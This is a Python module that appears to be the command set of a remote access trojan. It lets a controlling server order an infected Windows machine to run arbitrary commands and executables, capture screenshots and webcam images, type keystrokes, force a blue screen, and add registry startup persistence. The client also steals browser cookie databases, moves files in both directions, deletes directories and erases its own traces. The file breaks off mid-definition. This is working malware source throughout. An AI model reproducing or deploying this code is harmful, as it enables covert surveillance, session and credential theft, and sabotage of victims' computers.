from shared.extras.double_command import (
    DoubleCommandResult,
    add_double_command,
    CommandResult,
    DoubleCommand,
    ArgumentType,
    EmptyReturn,
)
from server_extras.client import Client

import socket


@add_double_command(
    "kill_proc",
    "kill_proc [ pid ]",
    "Kills a process on the client",
    [ArgumentType.integer],
    EmptyReturn,
)
class KillProcess(DoubleCommand):
    @staticmethod
    def client_side(sock: socket.socket) -> None:
        import signal
        import os

        try:
            pid = int.from_bytes(sock.recv(8))
        except OSError:
            return
        try:
            os.kill(pid, signal.SIGTERM)
            sock.sendall(b"y")
        except PermissionError:
            try:
                sock.sendall(b"n")
            except OSError:
                return
        except OSError:
            try:
                sock.sendall(b"?")
            except OSError:
                return

    @staticmethod
    def server_side(client: Client, params: tuple) -> CommandResult:
        try:
            client.socket.sendall(params[0].to_bytes(8))
        except TimeoutError:
            return CommandResult(DoubleCommandResult.timeout)
        except OSError:
            return CommandResult(DoubleCommandResult.conn_error)

        try:
            success_indicator = client.socket.recv(1).decode(errors="ignore")
        except OSError:
            print(
                "Maybe killed process, client did not respond with a success indicator."
            )
            return CommandResult(DoubleCommandResult.semi_success)
        match success_indicator:
            case "n":
                print("Client could not kill process.")
                return CommandResult(DoubleCommandResult.failure)
            case "?":
                print(
                    "Client responded that the PID doesn't exist, or that it is invalid."
                )
                return CommandResult(DoubleCommandResult.failure)
            case "y":
                print("Killed process.")
                return CommandResult(DoubleCommandResult.success)
            case _:
                print("Client returned unknown response.")
                return CommandResult(DoubleCommandResult.semi_success)


@add_double_command(
    "launch_exe",
    "launch_exe [ local exe path ]",
    "Launches an executable file on the client",
    [ArgumentType.string],
    int,
)
class LaunchExecutableFile(DoubleCommand):
    @staticmethod
    def client_side(sock: socket.socket) -> None:
        import subprocess
        import random
        import os

        exe_contents = bytearray()
        tmp_tries = 0
        while tmp_tries < 3:
            try:
                tmp_bytes = sock.recv(1024)
            except TimeoutError:
                break
            exe_contents += tmp_bytes
        if exe_contents == b"EXIT":
            return
        exe_path = f"{os.getenv('TEMP')}/{''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890', k=5))}.exe"
        try:
            with open(exe_path, "wb") as tmp_exe_fd:
                tmp_exe_fd.write(exe_contents)
            proc = subprocess.Popen(
                exe_path, creationflags=subprocess.CREATE_NEW_CONSOLE
            )
            sock.sendall(proc.pid.to_bytes(8))
        except TimeoutError:
            return
        except OSError:
            try:
                sock.sendall(int(-1).to_bytes(8, signed=True))
            except OSError:
                return

    @staticmethod
    def server_side(client: Client, params: tuple) -> CommandResult:
        try:
            with open(params[0], "rb") as exe_fd:
                client.socket.sendall(exe_fd.read())
        except TimeoutError:
            print(f"Connection to client timeouted...")
            return CommandResult(DoubleCommandResult.timeout)
        except OSError:
            client.socket.send(b"EXIT")
            print(f"Error opening file '{params[0]}'.")
            return CommandResult(DoubleCommandResult.param_error)
        client.socket.settimeout(10)
        try:
            proc_pid = int.from_bytes(client.socket.recv(8), signed=True)
        except (TypeError, ValueError, OSError):
            proc_pid = None

        if proc_pid == None:
            print("Maybe launched process, client did not respond with a PID.")
            return CommandResult(DoubleCommandResult.semi_success)
        elif proc_pid == -1:
            print("Could not start process.")
            return CommandResult(DoubleCommandResult.failure)

        print(f"Launched process with PID: {proc_pid}")
        return CommandResult(DoubleCommandResult.success, proc_pid)


@add_double_command(
    "invoke_bsod",
    "invoke_bsod",
    "Invokes a BSOD on the client",
    [],
    EmptyReturn,
)
class InvokeBSOD(DoubleCommand):
    @staticmethod
    def client_side(sock: socket.socket) -> None:
        import shared.command_consts
        import subprocess

        fail = False
        try:
            subprocess.Popen(shared.command_consts.EXECUTE_B64_BSOD)
        except OSError:
            fail = True
        try:
            if fail:
                sock.sendall(b"n")
            else:
                sock.sendall(b"y")
        except OSError:
            return

    @staticmethod
    def server_side(client: Client, params: tuple) -> CommandResult:
        try:
            response = client.socket.recv(1).decode(errors="ignore")
        except OSError:
            print(
                f"Possibly invoked BSOD, client did not respond with a success status."
            )
            return CommandResult(DoubleCommandResult.semi_success)
        match response:
            case "y":
                print(f"Invoked BSOD on client.")
                return CommandResult(DoubleCommandResult.success)
            case "n":
                print(f"Client could not execute script.")
                return CommandResult(DoubleCommandResult.failure)
            case _:
                print(f"Invalid success status from client.")
                return CommandResult(DoubleCommandResult.semi_success)


@add_double_command(
    "show_image",
    "show_image [ local image path ]",
    "Displays an image on the clients screen",
    [ArgumentType.string],
    EmptyReturn,
    required_client_modules=["Pillow"],
)
class ShowImage(DoubleCommand):
    @staticmethod
    def client_side(sock: socket.socket) -> None:
        import threading
        import PIL.Image
        import io

        try:
            tmp_buf = sock.recv(4096)
            img_contents = bytearray(tmp_buf)
        except OSError:
            return
        try:
            while len(tmp_buf) == 4096:
                tmp_buf = sock.recv(4096)
                img_contents += tmp_buf
        except OSError:
            pass

        try:
            if img_contents.decode() == b"EXIT":
                return
        except UnicodeDecodeError:
            pass

        threading.Thread(
            target=lambda img_contents: PIL.Image.open(io.BytesIO(img_contents)).show(),
            name="show_img",
            args=(img_contents,),
        ).start()

    @staticmethod
    def server_side(client: Client, params: tuple) -> CommandResult:
        try:
            with open(params[0], "rb") as img_file:
                img_contents = img_file.read()
        except OSError:
            print(f"Error reading file: '{params[0]}'")
            try:
                client.socket.sendall(b"EXIT")
            except OSError:
                pass
            return CommandResult(DoubleCommandResult.param_error)

        try:
            client.socket.sendall(img_contents)
        except OSError:
            return CommandResult(DoubleCommandResult.conn_error)

        print("Showed image on client.")
        return CommandResult(DoubleCommandResult.success)


@add_double_command(
    "screenshot",
    "screenshot",
    "Captures a screenshot on client",
    [],
    tuple[str, bytes],
    required_client_modules=["Pillow"],
)
class TakeScreenshot(DoubleCommand):
    @staticmethod
    def client_side(sock: socket.socket) -> None:
        import PIL.ImageGrab
        import io

        tmp_io = io.BytesIO()
        PIL.ImageGrab.grab().save(tmp_io, format="PNG")

        try:
            sock.sendall(tmp_io.getvalue())
        except OSError:
            pass

    @staticmethod
    def server_side(client: Client, params: tuple) -> CommandResult:
        import random
        import os

        try:
            os.mkdir("screenshots")
        except FileExistsError:
            pass

        try:
            tmp_buf = client.socket.recv(4096)
            img_contents = bytearray(tmp_buf)
        except OSError:
            return CommandResult(DoubleCommandResult.conn_error)
        try:
            while len(tmp_buf) == 4096:
                tmp_buf = client.socket.recv(4096)
                img_contents += tmp_buf
        except OSError:
            pass

        tmp_name = ""
        try:
            with open(f"screenshots/{client.name}.png", "wb") as screenshot_file:
                screenshot_file.write(img_contents)
        except OSError:
            tmp_name = "".join(
                random.choices(
                    "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890",
                    k=5,
                )
            )
            with open(f"screenshots/{tmp_name}.png", "wb") as screenshot_file:
                screenshot_file.write(img_contents)

        print(f"Captured screenshot: screenshots/{tmp_name or client.name}.png")
        return CommandResult(
            DoubleCommandResult.success,
            (f"screenshots/{tmp_name or client.name}.png", bytes(img_contents)),
        )


@add_double_command(
    "typewrite",
    "typewrite [ string to type ] { character delay }",
    "Types a string on the clients keyboard",
    [ArgumentType.string, ArgumentType.optional_float],
    EmptyReturn,
    required_client_modules=["pyautogui"],
)
class TypeWrite(DoubleCommand):
    @staticmethod
    def client_side(sock: socket.socket) -> None:
        import pyautogui
        import threading
        import struct

        try:
            interval = struct.unpack("d", sock.recv(8))[0]
            tmp_buf = sock.recv(1024)
            typewrite_str = bytearray(tmp_buf)
        except OSError:
            return

        try:
            while len(tmp_buf) == 1024:
                tmp_buf = sock.recv(1024)
                typewrite_str += tmp_buf
        except OSError:
            pass

        threading.Thread(
            target=lambda: pyautogui.typewrite(
                typewrite_str.decode(errors="ignore"), interval
            ),
            name="TypeWrite",
        ).start()

    @staticmethod
    def server_side(client: Client, params: tuple) -> CommandResult:
        import struct

        corrected_params = params
        if len(params) == 1:
            corrected_params = (params[0], 0)

        try:
            client.socket.sendall(struct.pack("d", corrected_params[1]))
            client.socket.sendall(corrected_params[0].encode())
        except OSError:
            return CommandResult(DoubleCommandResult.conn_error)

        print(
            f"Asked client to type {len(params[0])} characters with an interval {params[1]} seconds between each letter"
        )
        return CommandResult(DoubleCommandResult.success)


@add_double_command(
    "run_command",
    "run_command [ command ]",
    "Runs a command on the client",
    [ArgumentType.string],
    EmptyReturn,
)
class RunCommand(DoubleCommand):
    @staticmethod
    def client_side(sock: socket.socket) -> None:
        import subprocess

        try:
            tmp_buf = sock.recv(512)
            command = bytearray(tmp_buf)
        except OSError:
            return

        try:
            while len(tmp_buf) == 512:
                tmp_buf = sock.recv(512)
                command += tmp_buf
        except OSError:
            pass

        try:
            subprocess.Popen(command.decode())
            sock.sendall(b"y")
        except OSError:
            try:
                sock.sendall(b"n")
            except OSError:
                pass
        except UnicodeDecodeError:
            try:
                sock.sendall(b"?")
            except OSError:
                pass

    @staticmethod
    def server_side(client: Client, params: tuple) -> CommandResult:
        try:
            client.socket.sendall(params[0].encode())
        except OSError:
            return CommandResult(DoubleCommandResult.conn_error)

        try:
            success_indicator = client.socket.recv(1).decode()
        except (OSError, UnicodeDecodeError):
            print("Sent command, but client did not respond with a success status.")
            return CommandResult(DoubleCommandResult.semi_success)

        match success_indicator:
            case "y":
                print("Executed command on client.")
                return CommandResult(DoubleCommandResult.success)
            case "n":
                print("Client could not execute command.")
                return CommandResult(DoubleCommandResult.failure)
            case "?":
                print("Client didn't understand command.")
                return CommandResult(DoubleCommandResult.failure)
            case _:
                print(
                    "Sent command, but client did not respond with a valid success status."
                )
                return CommandResult(DoubleCommandResult.semi_success)


@add_double_command(
    "webcam_img",
    "webcam_img",
    "Captures an image from the clients webcam",
    [],
    tuple[str, bytes],
    required_client_modules=["opencv-python", "numpy"],
)
class CaptureWebcamImage(DoubleCommand):
    @staticmethod
    def client_side(sock: socket.socket) -> None:
        import numpy
        import cv2

        capture = cv2.VideoCapture(0)

        if not capture.isOpened():
            try:
                sock.sendall(b"n")
            except OSError:
                pass
            return

        success, frame = capture.read()

        if not success:
            try:
                sock.sendall(b"f")
            except OSError:
                pass
            return

        capture.release()

        try:
            image_bytes = numpy.array(cv2.imencode(".png", frame)[1]).tobytes()
        except Exception:
            try:
                sock.sendall(b"?")
            except OSError:
                pass
            return

        try:
            sock.sendall(b"y")
        except OSError:
            pass

        try:
            sock.sendall(image_bytes)
        except OSError:
            pass

    @staticmethod
    def server_side(client: Client, params: tuple) -> CommandResult:
        import random
        import os

        try:
            os.mkdir("webcam_images")
        except FileExistsError:
            pass

        try:
            success_indicator = client.socket.recv(1).decode(errors="ignore")
        except OSError:
            print("Client failed to respond with a success indicator.")
            return CommandResult(DoubleCommandResult.conn_error)

        match success_indicator:
            case "y":
                pass
            case "n":
                print("Client could not open webcam (they are probably missing one)")
                return CommandResult(DoubleCommandResult.failure)
            case "f":
                print("Client could not capture image (webcam error)")
                return CommandResult(DoubleCommandResult.failure)
            case "?":
                print("Client encountered an error while decoding the image")
                return CommandResult(DoubleCommandResult.failure)
            case _:
                print("Client failed to respond with a valid success indicator.")
                return CommandResult(DoubleCommandResult.failure)

        try:
            tmp_buf = client.socket.recv(4096)
            img_contents = bytearray(tmp_buf)
        except OSError:
            return CommandResult(DoubleCommandResult.conn_error)

        try:
            while len(tmp_buf) == 4096:
                tmp_buf = client.socket.recv(4096)
                img_contents += tmp_buf
        except OSError:
            pass

        tmp_name = ""
        try:
            with open(f"webcam_images/{client.name}.png", "wb") as screenshot_file:
                screenshot_file.write(img_contents)
        except OSError:
            tmp_name = "".join(
                random.choices(
                    "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890",
                    k=5,
                )
            )
            with open(f"webcam_images/{tmp_name}.png", "wb") as screenshot_file:
                screenshot_file.write(img_contents)

        print(f"Captured image: webcam_images/{tmp_name or client.name}.png")
        return CommandResult(
            DoubleCommandResult.success,
            (f"webcam_images/{tmp_name or client.name}.png", bytes(img_contents)),
        )


@add_double_command(
    "add_persistence",
    "add_persistence",
    "Adds the client infection to PC startup",
    [],
    str,
)
class AddPersistence(DoubleCommand):
    @staticmethod
    def client_side(sock: socket.socket) -> None:
        import urllib.request
        import subprocess
        import zipfile
        import winreg
        import shutil
        import os

        def bail(msg: bytes) -> None:
            try:
                sock.sendall(msg)
            except OSError:
                pass
            shutil.rmtree(folder_path, ignore_errors=True)

        key_name = "C3Persistence"
        folder_name = key_name
        folder_path = f"{os.getenv('LOCALAPPDATA')}/{folder_name}"

        runtime_path = f"{folder_path}/runtime"
        runtime_zip_path = f"{runtime_path}/python-3.12.1-embed-amd64.zip"
        os.mkdir(folder_path)
        os.mkdir(runtime_path)

        try:
            urllib.request.urlretrieve(
                "https://www.python.org/ftp/python/3.12.1/python-3.12.1-embed-amd64.zip",
                runtime_zip_path,
            )
            with zipfile.ZipFile(runtime_zip_path, "r") as zip_file:
                zip_file.extractall(runtime_path)
            os.remove(runtime_zip_path)
        except Exception:
            bail(b"GETPY_ERR")
            return

        try:
            urllib.request.urlretrieve(
                "https://bootstrap.pypa.io/get-pip.py", f"{runtime_path}/get-pip.py"
            )
            get_pip_runner = subprocess.Popen(
                f"{runtime_path}/python.exe {runtime_path}/get-pip.py",
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )
            get_pip_runner.wait()
            os.remove(f"{runtime_path}/get-pip.py")
        except OSError:
            bail(b"GETPIP_ERR")
            return

        shutil.copytree("./client_extras", f"{folder_path}/client_extras")
        shutil.copytree("./server_extras", f"{folder_path}/server_extras")
        shutil.copytree("./shared", f"{folder_path}/shared")
        # .pyw files do not show a console window
        shutil.copy("./server.py", f"{folder_path}/server.pyw")
        shutil.copy("./client.py", f"{folder_path}/client.pyw")

        try:
            with winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                0,
                winreg.KEY_SET_VALUE,
            ) as startup_key:
                winreg.SetValueEx(
                    startup_key,
                    key_name,
                    0,
                    winreg.REG_SZ,
                    f"{runtime_path}/pythonw.exe {folder_path}/client.pyw",
                )
        except OSError:
            bail(b"REG_ERR")
            return
        try:
            sock.sendall(folder_path.encode())
        except OSError:
            pass

    @staticmethod
    def server_side(client: Client, params: tuple) -> CommandResult:
        try:
            install_path = (
                client.socket.recv(256).decode(errors="ignore").replace("/", "\\")
            )
        except OSError:
            print("Client did not respond with a success indicator.")
            return CommandResult(DoubleCommandResult.conn_error)

        match install_path:
            case "REG_ERR":
                print("Client encountered registry error.")
                return CommandResult(DoubleCommandResult.failure)
            case "GETPY_ERR":
                print("Client failed to download the portable python environment.")
                return CommandResult(DoubleCommandResult.failure)
            case "GETPIP_ERR":
                print("Client failed to download pip (Pythons Intergalactic Penis).")
                return CommandResult(DoubleCommandResult.failure)
            case _:
                print(f"Client installed persistence to '{install_path}'")
                return CommandResult(DoubleCommandResult.success, install_path)


@add_double_command(
    "reboot",
    "reboot { delay seconds }",
    "Reboots the client PC",
    [ArgumentType.optional_float],
    EmptyReturn,
)
class Reboot(DoubleCommand):
    @staticmethod
    def client_side(sock: socket.socket) -> None:
        import subprocess
        import threading
        import time

        def delayed_reboot(delay_in_ms: int) -> None:
            time.sleep(delay_in_ms / 1000)
            subprocess.Popen(["shutdown", "/f", "/r", "/t", "0"])

        try:
            threading.Thread(
                target=delayed_reboot,
                name="Delayed Reboot",
                args=[int.from_bytes(sock.recv(8))],
            ).start()
        except OSError:
            pass

    @staticmethod
    def server_side(client: Client, params: tuple) -> CommandResult:
        if len(params) == 0:
            params = (0,)

        try:
            client.socket.sendall(round(params[0] * 1000).to_bytes(8))
        except OSError:
            print(f"Failed to send delay time to client.")
            return CommandResult(DoubleCommandResult.conn_error)

        if params[0] == 0:
            print(f"Asked client to reboot immediately.")
        else:
            print(f"Asked client to reboot in {params[0]} seconds.")
        return CommandResult(DoubleCommandResult.success)


@add_double_command(
    "shutdown",
    "shutdown { delay seconds }",
    "Turns off the client PC",
    [ArgumentType.optional_float],
    EmptyReturn,
)
class Shutdown(DoubleCommand):
    @staticmethod
    def client_side(sock: socket.socket) -> None:
        import subprocess
        import threading
        import time

        def delayed_shutdown(delay_in_ms: int) -> None:
            time.sleep(delay_in_ms * 1000)
            subprocess.Popen(["shutdown", "/f", "/s", "/t", "0"])

        try:
            threading.Thread(
                target=delayed_shutdown,
                name="Delayed Shutdown",
                args=[int.from_bytes(sock.recv(8))],
            ).start()
        except OSError:
            pass

    @staticmethod
    def server_side(client: Client, params: tuple) -> CommandResult:
        if len(params) == 0:
            params = (0,)

        try:
            client.socket.sendall(round(params[0] * 1000).to_bytes(8))
        except OSError:
            print(f"Failed to send delay time to client.")
            return CommandResult(DoubleCommandResult.conn_error)

        if params[0] == 0:
            print(f"Asked client to shut down immediately.")
        else:
            print(f"Asked client to shut down in {params[0]} seconds.")
        return CommandResult(DoubleCommandResult.success)


@add_double_command(
    "self_destruct",
    "self_destruct",
    "Self destructs and removes all trace of infection on the client side",
    [],
    EmptyReturn,
)
class SelfDestruct(DoubleCommand):
    @staticmethod
    def client_side(sock: socket.socket) -> None:
        from shared.command_consts import SELF_DESTRUCT_TEMPLATE
        import subprocess
        import winreg
        import sys
        import os

        try:
            with winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                "HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
                access=winreg.KEY_READ | winreg.KEY_WRITE,
            ) as startup_entries_key:
                num_entries = winreg.QueryInfoKey(startup_entries_key)[1]

                for entry_index in range(num_entries):
                    key_name, *_ = winreg.EnumValue(startup_entries_key, entry_index)
                    if key_name == "C3Persistence":
                        winreg.DeleteKey(
                            startup_entries_key,
                            key_name,
                        )
        except Exception:
            pass

        parent_dir = "/".join(os.path.split(__file__)[0].split("\\")[:-1])
        with open(f"{parent_dir}/self_destruct.bat", "w") as tmp_self_destruct_launcher:
            tmp_self_destruct_launcher.write(
                SELF_DESTRUCT_TEMPLATE.format(pdir=parent_dir)
            )
        subprocess.Popen(
            f"cmd /c {parent_dir}/self_destruct.bat && del /f {parent_dir}/self_destruct.bat && exit"
        )

        sys.exit()

    @staticmethod
    def server_side(client: Client, params: tuple) -> CommandResult:
        print("Killed and asked client to self destruct.")
        client.kill()
        return CommandResult(DoubleCommandResult.success)


@add_double_command(
    "steal_cookies",
    "steal_cookies",
    "Downloads cookies from the client",
    [],
    str,
)
class CookieStealer(DoubleCommand):
    @staticmethod
    def client_side(sock: socket.socket) -> None:
        import os

        LOCAL = os.getenv("LOCALAPPDATA")
        if LOCAL == None:
            return

        paths: dict[str, str] = {}
        if len(LOCAL) > 0:
            paths["chrome"] = f"{LOCAL}/Google/Chrome/User Data/Default/Network/Cookies"
            paths[
                "yandex"
            ] = f"{LOCAL}/Yandex/YandexBrowser/User Data/Network/Default/Cookies"
            paths[
                "brave"
            ] = f"{LOCAL}/BraveSoftware/Brave-Browser/User Data/Default/Network/Cookies"
            paths["edge"] = f"{LOCAL}/Microsoft/Edge/User Data/Default/Network/Cookies"
            paths["vivaldi"] = f"{LOCAL}/Vivaldi/User Data/Default/Network/Cookies"
            paths["chromium"] = f"{LOCAL}/Chromium/User Data/Default/Network/Cookies"
            paths["torch"] = f"{LOCAL}/Torch/User Data/Default/Network/Cookies"

        for browser_name, path in paths.items():
            try:
                with open(path, "rb") as cookies_file:
                    cookies_sql = cookies_file.read()
                    sock.sendall(len(browser_name).to_bytes(8))
                    sock.sendall(len(cookies_sql).to_bytes(8))
                    sock.sendall(browser_name.encode())
                    sock.sendall(cookies_sql)
            except OSError:
                continue

    @staticmethod
    def server_side(client: Client, params: tuple) -> CommandResult:
        import random
        import os

        try:
            os.mkdir("cookies")
        except FileExistsError:
            pass
        try:
            target_folder = f"cookies/{client.name}"
            os.mkdir(target_folder)
        except OSError:
            tmpname = "".join(
                random.choices("abcdefghijklmnopqrstuvwxyz1234567890", k=6)
            )
            target_folder = f"cookies/{tmpname}"
            os.mkdir(target_folder)

        is_first_run = True
        while True:
            try:
                lengths = client.socket.recv(16)
                name_length = int.from_bytes(lengths[:8])
                db_length = int.from_bytes(lengths[8:])
                filename = (
                    client.socket.recv(name_length)
                    .decode(errors="ignore")
                    .translate(str.maketrans({char: "" for char in '\\/*?<>:|"'}))
                )
                cookies_db = client.socket.recv(db_length)
                try:
                    with open(f"{target_folder}/{filename}.db", "wb") as cookies_db_fd:
                        cookies_db_fd.write(cookies_db)
                except OSError:
                    pass
                is_first_run = False
            except OSError:
                if is_first_run:
                    print("Client failed to send cookies.")
                    return CommandResult(DoubleCommandResult.conn_error)
                break

        print(
            f"Downloaded {len(os.listdir(target_folder))} cookie databases to {target_folder}"
        )
        return CommandResult(DoubleCommandResult.success, target_folder)


@add_double_command(
    "upload_file",
    "upload_file [ local path ] [ client side path ]",
    "Uploads a file to the client",
    [ArgumentType.string, ArgumentType.string],
    EmptyReturn,
)
class UploadFile(DoubleCommand):
    @staticmethod
    def client_side(sock: socket.socket) -> None:
        try:
            destination = sock.recv(int.from_bytes(sock.recv(8)))
            file_contents = sock.recv(int.from_bytes(sock.recv(8)))
        except OSError:
            return

        response = b"y"
        try:
            with open(destination, "wb") as dest_file:
                dest_file.write(file_contents)
        except PermissionError:
            response = b"p"
        except OSError:
            response = b"?"

        try:
            sock.sendall(response)
        except OSError:
            return

    @staticmethod
    def server_side(client: Client, params: tuple) -> CommandResult:
        import os

        if not os.path.isfile(params[0]):
            print(f"File '{params[0]} not found")
            return CommandResult(DoubleCommandResult.param_error)

        with open(params[0], "rb") as file_to_send:
            try:
                file_contents = file_to_send.read()
                client.socket.sendall(len(params[1]).to_bytes(8))
                client.socket.sendall(params[1].encode())
                client.socket.sendall(len(file_contents).to_bytes(8))
                client.socket.sendall(file_contents)
            except OSError:
                print("Connection error whilst trying to send file")
                return CommandResult(DoubleCommandResult.conn_error)

        try:
            success_indicator = client.socket.recv(1).decode(errors="ignore")
        except OSError:
            print("Sent file but client did not respond with a success indicator")
            return CommandResult(DoubleCommandResult.semi_success)

        match success_indicator:
            case "y":
                print("Sent file successfully")
                return CommandResult(DoubleCommandResult.success)
            case "p":
                print(
                    f"Client does not have permission to write the given file {params[1]}"
                )
                return CommandResult(DoubleCommandResult.failure)
            case "?":
                print(
                    f"Client says that the given destination file path ({params[1]}) is invalid"
                )
                return CommandResult(DoubleCommandResult.failure)
            case _:
                print(
                    "Sent file but client did not respond with an invalid success indicator"
                )
                return CommandResult(DoubleCommandResult.semi_success)


@add_double_command(
    "download_file",
    "download_file [ client side path ] [ local path ]",
    "Downloads a file from the client",
    [ArgumentType.string, ArgumentType.string],
    EmptyReturn,
)
class DownloadFile(DoubleCommand):
    @staticmethod
    def client_side(sock: socket.socket) -> None:
        try:
            source = sock.recv(int.from_bytes(sock.recv(8)))
        except OSError:
            return

        response = b"y"
        try:
            with open(source, "rb") as src_file:
                file_contents = src_file.read()
        except PermissionError:
            response = b"p"
        except FileNotFoundError:
            response = b"n"
        except OSError:
            response = b"?"

        try:
            sock.sendall(response)
        except OSError:
            pass

        if response != b"y":
            return
        try:
            sock.sendall(len(file_contents).to_bytes(8))  # type: ignore
            sock.sendall(file_contents)  # type: ignore
        except OSError:
            return

    @staticmethod
    def server_side(client: Client, params: tuple) -> CommandResult:
        try:
            client.socket.sendall(len(params[0]).to_bytes(8))
            client.socket.sendall(params[0].encode())
        except OSError:
            print("Connection error whilst trying to send source file path")
            return CommandResult(DoubleCommandResult.conn_error)

        try:
            success_indicator = client.socket.recv(1).decode(errors="ignore")
        except OSError:
            print("Asked for file but client did not respond with a success indicator")
            return CommandResult(DoubleCommandResult.semi_success)

        match success_indicator:
            case "y":
                try:
                    file_contents = client.socket.recv(
                        int.from_bytes(client.socket.recv(8))
                    )
                except OSError:
                    print("Connection error whilst trying to recieve file contents")
                    return CommandResult(DoubleCommandResult.conn_error)
                except MemoryError:
                    print("Client sent invalid information")
                    return CommandResult(DoubleCommandResult.failure)
                try:
                    with open(params[1], "wb") as dest_file:
                        dest_file.write(file_contents)
                except OSError:
                    print(f"Failure when writing to '{params[1]}")
                    return CommandResult(DoubleCommandResult.failure)
                print("Recieved and wrote file successfully")
                return CommandResult(DoubleCommandResult.success)
            case "p":
                print(
                    f"Client does not have permission to read the given file ('{params[0]}')"
                )
                return CommandResult(DoubleCommandResult.failure)
            case "?":
                print(
                    f"Client says that the given source file path ('{params[0]}') is invalid"
                )
                return CommandResult(DoubleCommandResult.failure)
            case "n":
                print(f"Client says that the given file ('{params[0]}') doesn't exist")
                return CommandResult(DoubleCommandResult.failure)
            case _:
                print(
                    "Recieved and wrote file but client did not respond with an invalid success indicator"
                )
                return CommandResult(DoubleCommandResult.failure)


@add_double_command(
    "open_url",
    "open_url [ url ]",
    "Opens a URL in a new webbrowser on the client",
    [ArgumentType.string],
    EmptyReturn,
)
class OpenURL(DoubleCommand):
    @staticmethod
    def client_side(sock: socket.socket) -> None:
        import webbrowser

        try:
            webbrowser.open(sock.recv(int.from_bytes(sock.recv(8))).decode())
        except OSError:
            return

    @staticmethod
    def server_side(client: Client, params: tuple) -> CommandResult:
        try:
            client.socket.sendall(len(params[0]).to_bytes(8))
            client.socket.sendall(params[0].encode())
        except OSError:
            print("Connection error whilst sending url to client")
            return CommandResult(DoubleCommandResult.failure)

        print("Opened url on client")
        return CommandResult(DoubleCommandResult.success)


@add_double_command(
    "ls",
    "ls [ directory ]",
    "Lists a directory on the client",
    [ArgumentType.string],
    EmptyReturn,
)
class ListDirectory(DoubleCommand):
    @staticmethod
    def client_side(sock: socket.socket) -> None:
        import os

        try:
            path = sock.recv(int.from_bytes(sock.recv(8))).decode(errors="ignore")
        except OSError:
            return

        items = []
        for item in os.listdir(path):
            abs_item = f"{path}/{item}"
            if os.path.isdir(abs_item):
                items.append(f"<DIR>  -> {item}")
            elif os.path.isfile(abs_item):
                items.append(f"<FILE> -> {item}")
        output = "\n".join(items).encode()
        try:
            sock.sendall(len(output).to_bytes(8))
            sock.sendall(output)
        except OSError:
            return

    @staticmethod
    def server_side(client: Client, params: tuple) -> CommandResult:
        try:
            path = params[0].encode("utf-8")
            client.socket.sendall(len(path).to_bytes(8))
            client.socket.sendall(path)
        except OSError:
            print("Failed to send path to client")
            return CommandResult(DoubleCommandResult.conn_error)

        try:
            contents = client.socket.recv(int.from_bytes(client.socket.recv(8))).decode(
                "utf-8", "ignore"
            )
            print(contents)
        except (OSError, MemoryError):
            print(f"Error recieving items in {params[0]}")
            return CommandResult(DoubleCommandResult.failure)
        return CommandResult(DoubleCommandResult.success)


@add_double_command(
    "mkdir",
    "mkdir [ directory path ]",
    "Creates a directory on the client",
    [ArgumentType.string],
    EmptyReturn,
)
class MakeDirectory(DoubleCommand):
    @staticmethod
    def client_side(sock: socket.socket) -> None:
        import os

        try:
            path = sock.recv(int.from_bytes(sock.recv(8))).decode(errors="ignore")
        except OSError:
            return

        try:
            os.mkdir(path)
        except PermissionError:
            status = b"p"
        except FileExistsError:
            status = b"f"
        except FileNotFoundError:
            status = b"d"
        except OSError:
            status = b"n"
        else:
            status = b"y"

        try:
            sock.sendall(status)
        except OSError:
            return

    @staticmethod
    def server_side(client: Client, params: tuple) -> CommandResult:
        try:
            path = params[0].encode()
            client.socket.sendall(len(path).to_bytes(8))
            client.socket.sendall(path)
        except OSError:
            print("Failed to send path to client")
            return CommandResult(DoubleCommandResult.failure)

        try:
            status = client.socket.recv(1).decode(errors="ignore")
        except OSError:
            print("Sent path, but client did not respond with a success indicator")
            return CommandResult(DoubleCommandResult.semi_success)

        match status:
            case "n":
                print("There was an error when creating the directory")
                return CommandResult(DoubleCommandResult.failure)
            case "f":
                print("Directory already exists")
                return CommandResult(DoubleCommandResult.failure)
            case "d":
                print("Parent directory doesn't exist")
                return CommandResult(DoubleCommandResult.failure)
            case "p":
                print("The client does not have permission to create such directory")
                return CommandResult(DoubleCommandResult.failure)
            case "y":
                print("Successfully created directory")
                return CommandResult(DoubleCommandResult.success)
            case _:
                print(
                    "Sent path, but client did not respond with a valid success indicator"
                )
                return CommandResult(DoubleCommandResult.semi_success)


@add_double_command(
    "rmdir",
    "rmdir [ directory path ]",
    "Recursively deletes a directory on the client",
    [ArgumentType.string],
    EmptyReturn,
)
class DeleteDirectory(DoubleCommand):
    @staticmethod
    def client_side(sock: socket.socket) -> None:
        import os.path
        import shutil

        try:
            path = sock.recv(int.from_bytes(sock.recv(8))).decode(errors="ignore")
        except OSError:
            return

        try:
            shutil.rmtree(path)
        except PermissionError:
            status = "p"
        except FileNotFoundError:
            status = "d"
        except OSError:
            status = "n"
        else:
            status = "y"

        if os.path.isfile(path):
            status = "f"

        try:
            sock.sendall(status.encode())
        except OSError:
            return

    @staticmethod
    def server_side(client: Client, params: tuple) -> CommandResult:
        try:
            path = params[0].encode()
            client.socket.sendall(len(path).to_bytes(8))
            client.socket.sendall(path)
        except OSError:
            print("Failed to send path to client")
            return CommandResult(DoubleCommandResult.failure)

        try:
            status = client.socket.recv(1).decode(errors="ignore")
        except OSError:
            print("Sent path, but client did not respond with a success indicator")
            return CommandResult(DoubleCommandResult.semi_success)

        match status:
            case "n":
                print("There was an error when deleting the directory")
                return CommandResult(DoubleCommandResult.failure)
            case "d":
                print("Directory doesn't exist")
                return CommandResult(DoubleCommandResult.failure)
            case "p":
                print("The client does not have permission to remove such directory")
                return CommandResult(DoubleCommandResult.failure)
            case "f":
                print("That path is a file")
                return CommandResult(DoubleCommandResult.failure)
            case "y":
                print("Successfully deleted directory")
                return CommandResult(DoubleCommandResult.success)
            case _:
                print(
                    "Sent path, but client did not respond with a valid success indicator"
                )
                return CommandResult(DoubleCommandResult.semi_success)


@add_double_command(
    "del",
    "del [ file path ]",
